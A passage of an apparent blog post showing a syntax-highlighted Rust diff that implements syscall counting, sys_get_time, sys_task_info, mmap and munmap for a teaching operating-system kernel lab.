punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">==</span> range<span class="token punctuation">.</span><span class="token function">get_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span>         <span class="token operator">&amp;&amp;</span> area<span class="token punctuation">.</span>vpn_range<span class="token punctuation">.</span><span class="token function">get_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">==</span> range<span class="token punctuation">.</span><span class="token function">get_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">&#123;</span>            area<span class="token punctuation">.</span><span class="token function">unmap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">.</span>page_table<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>areas<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 01e62fd..e916f1e 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -2,7 +2,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -117,6 +117,13 @@ pub fn frame_dealloc(ppn: PhysPageNum) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    FRAME_ALLOCATOR.exclusive_access().dealloc(ppn);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(unused)]</span><span class="token prefix unchanged"> </span><span class="token line">/// a simple test for frame allocator</span><span class="token prefix unchanged"> </span><span class="token line">pub fn frame_allocator_test() &#123;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex 7a7b7ea..fca0b7f 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -63,6 +63,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn push(&amp;mut self, mut map_area: MapArea, data: Option&lt;&amp;[u8]>) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        map_area.map(&amp;mut self.page_table);</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some(data) = data &#123;</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex 06f045c..8f21283 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -12,9 +12,9 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix deleted">-</span><span class="token line">use address::&#123;StepByOne, VPNRange&#125;;</span><span class="token prefix deleted">-</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use address::StepByOne;</span><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;kernel_stack_position, MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use page_table::&#123;translated_byte_buffer, PageTableEntry&#125;;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 4a5297d..129ed7f 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -30,8 +30,11 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::inc_syscall_times;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_EXIT => sys_exit(args[0] as i32),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex e2f6662..e23a90c 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,9 +1,11 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix deleted">-</span><span class="token line">    task::&#123;</span><span class="token prefix deleted">-</span><span class="token line">        change_program_brk, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    config::MAX_SYSCALL_NUM, mm::translated_byte_buffer, task::&#123;</span><span class="token prefix inserted">+</span><span class="token line">        change_program_brk, current_user_token, exit_current_and_run_next, get_scheduled_timespan, get_syscall_times, suspend_current_and_run_next, task_mmap, task_munmap, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -43,7 +45,21 @@ pub fn sys_yield() -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_get_time");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -51,19 +67,33 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_task_info NOT IMPLEMENTED YET!");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_mmap NOT IMPLEMENTED YET!");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // trace!("kernel: sys_mmap NOT IMPLEMENTED YET!");</span><span class="token prefix inserted">+</span><span class="token line">    task_mmap(_start, _len, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_munmap NOT IMPLEMENTED YET!");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // trace!("kernel: sys_munmap NOT IMPLEMENTED YET!");</span><span class="token prefix inserted">+</span><span class="token line">    task_munmap(_start, _len)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_sbrk(size: i32) -> isize &#123;</span></span>diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex a745df8..460b23b 100644<span class="token coord">--- a/os/src/task/mod.rs</span><span class="token coord">+++ b/os/src/task/mod.rs</span>@@ -14,8 +14,11 @@ mod switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(clippy::module_inception)]</span><span class="token prefix unchanged"> </span><span class="token line">mod task;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::MAX_SYSCALL_NUM;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::loader::&#123;get_app_data, get_num_app&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;is_mem_sufficient, MapPermission, VPNRange, VirtAddr, VirtPageNum&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -140,6 +143,11 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut inner = self.inner.exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let current = inner.current_task;</span><span class="token prefix unchanged"> </span><span class="token line">            inner.tasks[next].task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if inner.tasks[next].time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                inner.tasks[next].time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.current_task = next;</span><span class="token prefix unchanged"> </span><span class="token line">            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;</span></span>@@ -153,6 +161,80 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            panic!("All applications completed!");</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task's time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.tasks[current].time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let cur = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[cur].memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let cur = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[cur].memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Run the first task in task list.</span></span>@@ -202,3 +284,46 @@ pub fn current_trap_cx() -> &amp;'static mut TrapContext &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub fn change_program_brk(size: i32) -> Option&lt;usize> &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    TASK_MANAGER.change_current_program_brk(size)</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_syscall_times() -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_syscall_times()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task's time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_scheduled_timespan() -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_scheduled_timespan()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Increase current task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn inc_syscall_times(syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.inc_syscall_times(syscall_id)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Map some pages to current task's memory_set</span><span class="token prefix inserted">+</span><span class="token line">pub fn task_mmap(start: usize, len: usize, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || port &amp; !0x7 != 0 || port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(start + len);</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.mmap(start_va, end_va, port)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Unmap some pages in current task's memory set</span><span class="token prefix inserted">+</span><span class="token line">pub fn task_munmap(start: usize, len: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(start + len);</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.munmap(start_va, end_va)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex dce6981..396342d 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,6 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    kernel_stack_position, MapPermission, MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE,</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -28,6 +28,12 @@ pub struct TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -63,6 +69,8 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            base_size: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">            heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">            program_brk: user_sp,</span></span><span 